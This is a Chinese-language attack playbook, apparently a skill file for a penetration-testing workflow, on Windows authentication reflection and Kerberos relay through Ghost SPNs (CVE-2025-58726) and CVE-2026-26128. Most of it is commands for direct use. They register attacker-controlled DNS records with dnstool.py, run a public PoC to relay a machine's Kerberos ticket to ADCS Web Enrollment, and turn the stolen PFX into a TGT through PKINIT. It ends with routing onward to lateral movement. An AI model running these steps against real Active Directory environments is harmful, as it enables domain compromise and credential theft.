# Windows Authentication Reflection / Kerberos Relay

认证反射必须逐层判断：

```
认证协议
→ 名称/SPN条件
→ coercion来源
→ DNS控制
→ 目标服务
→ signing / EPA / channel binding
→ Windows版本与补丁
```

**“能强制认证”不等于“能relay”，“Ghost SPN存在”也不等于“必得SYSTEM”。**

---

## 1. 从 /ad-recon 接收的信号

```
Ghost SPN候选
可控AD-integrated DNS
ADCS Web Enrollment /certsrv/
MSSQL使用machine account运行
目标Windows build / 补丁状态
```

---

## 2. Ghost SPN — CVE-2025-58726

状态：**SMB反射路径已于2025年10月修补；Ghost SPN本身仍是需要审计的认证攻击面。**

公开研究链的典型条件：

```
低权限域用户
+ Ghost HOST/CIFS SPN
+ 可创建对应AD DNS记录
+ 目标SMB signing未强制
+ 目标未安装CVE-2025-58726修复
```


域内Windows只读检测：

```powershell
. .\TestComputerSpnDNS.ps1
Test-ComputerSpnDns
```

例如发现：

```
CIFS/OLD-SRV.corp.local
```

先确认DNS确实不存在：

```bash
host OLD-SRV.corp.local DC-IP
# 或
nslookup OLD-SRV.corp.local DC-IP
```

### 注册缺失DNS记录

工具：`krbrelayx/dnstool.py`

```bash
python3 dnstool.py \
  -u 'CORP\jen' \
  -p 'Password123!' \
  -r OLD-SRV.corp.local \
  -a add \
  -d KALI-IP \
  DC01.corp.local
```

确认：

```bash
host OLD-SRV.corp.local DC-IP
```

之后才进入具体coercion + relay实现。

### 清理DNS

```bash
python3 dnstool.py \
  -u 'CORP\jen' \
  -p 'Password123!' \
  -r OLD-SRV.corp.local \
  -a remove \
  DC01.corp.local
```

> Ghost SPN相关KrbRelay工具CLI在不同分支/版本存在参数名漂移。Skill不固定一条可能失效的“一键SYSTEM”命令；使用具体KrbRelayEx/KrbRelay版本时先以该版本 `--help` 为准。

---

## 3. CVE-2026-26128 — Unicode Kerberos Reflection / Coercion

状态：**版本门控 + 服务门控。**

公开PoC：`jarnovandenbrink/CVE-2026-26128`

特点：利用Windows不同组件对Unicode hostname/SPN规范化不一致，诱导机器为Unicode名称生成Kerberos AP-REQ，再relay给允许该票据的服务。

### 安装

```bash
git clone https://github.com/jarnovandenbrink/CVE-2026-26128.git
cd CVE-2026-26128
pip install -r requirements.txt
```

### ADCS Web Enrollment完整PoC

前置：

```
目标存在 http(s)://CA/certsrv/
目标Web Enrollment允许当前relay条件
攻击机可在AD DNS写记录
目标服务未通过CBT/EPA/签名完整阻止该relay
```

执行：

```bash
python3 CVE-2026-26128.py \
  corp.local/jen:'Password123!' \
  -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -l KALI-IP \
  -dc-ip DC-IP
```

典型成功输出：

```
Adding DNS record: <unicode-host>.corp.local
Waiting for DNS propagation...
Setting up SMB Server
SMBD: Received connection from ...
Attack worked!
Certificate will be written to: ...pfx
GOT CERTIFICATE!
```

### 用PFX验证PKINIT

PoC会提示对应命令。典型：

```bash
python3 gettgtpkinit.py \
  corp.local/CA01$ \
  -cert-pfx ./CA01.pfx \
  -dc-ip DC-IP \
  out.ccache
```

然后：

```bash
export KRB5CCNAME=out.ccache
klist
```

如果证书主体是高价值机器账户，再按现有证书/Kerberos路径判断后续能力，不直接假定DA。

### MSSQL分支

公开PoC还支持MSSQL relay，但必须确认SQL Server以**machine account**运行，否则AP-REQ不能由对应机器密钥正确解密。

因此先枚举：

```
MSSQL service identity == TARGET$ ?
```

不满足就不进入该分支。

### 补丁判断

CVE-2026-26128的SMB loopback LPE路径已在2026年3月安全更新中修复。

```
已修补 + 目标是SMB loopback
  → 关闭该路径

HTTP/ADCS/MSSQL等其他relay目标
  → 仍按目标服务的CBT/EPA/完整性保护单独判断
```

### 清理

PoC会创建Unicode DNS记录。记录其实际名称；测试后删除对应记录，优先用PoC自身清理能力（若当前版本提供），否则使用 `dnstool.py -a remove` 精确删除本次创建的记录。

---

## 4. 失败判断

```
无法写AD DNS
  → Ghost/Unicode DNS路径关闭

目标协议强制signing / EPA / CBT
  → relay路径关闭

SPN映射不到目标机器密钥
  → AP-REQ无法在目标服务解密

PoC能coerce但目标返回401/403或认证失败
  → 不等于漏洞不存在；先核对target URL、SPN、补丁、EPA/CBT和服务身份
```

---

## 5. 路由

```
拿到机器PFX/CCACHE
  → ADCS/Kerberos后续

拿到目标服务上下文
  → 按服务权限进入横移/证书/管理平面

WAC
  → references/management-plane.md
```
